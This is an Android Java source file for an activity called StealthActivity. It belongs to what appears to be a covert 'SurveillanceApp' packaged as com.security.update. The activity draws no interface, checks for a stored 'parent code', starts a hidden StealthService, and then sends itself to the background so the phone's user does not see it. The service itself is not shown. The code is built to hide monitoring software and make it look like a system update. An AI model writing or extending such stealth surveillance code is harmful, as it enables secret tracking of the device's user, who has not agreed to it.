package com.security.update;

import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.view.Window;
import android.view.WindowManager;
import androidx.appcompat.app.AppCompatActivity;

public class StealthActivity extends AppCompatActivity {
    
    private SharedPreferences prefs;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Make completely invisible
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, 
                           WindowManager.LayoutParams.FLAG_FULLSCREEN);
        
        // No setContentView - completely invisible
        
        prefs = getSharedPreferences("SurveillanceApp", MODE_PRIVATE);
        
        // STRICT CHECK: Must have verified parent code
        String parentCode = prefs.getString("parent_code", "");
        boolean isVerified = prefs.getBoolean("code_verified", false);
        
        if (parentCode.isEmpty() || !isVerified) {
            // No valid code, show login IMMEDIATELY
            Intent loginIntent = new Intent(this, LoginActivity.class);
            startActivity(loginIntent);
        } else {
            // Already have verified code, start stealth service directly
            Intent serviceIntent = new Intent(this, StealthService.class);
            serviceIntent.putExtra("PARENT_CODE", parentCode);
            startService(serviceIntent);
        }
        
        // Hide immediately
        moveTaskToBack(true);
        finish();
    }
}
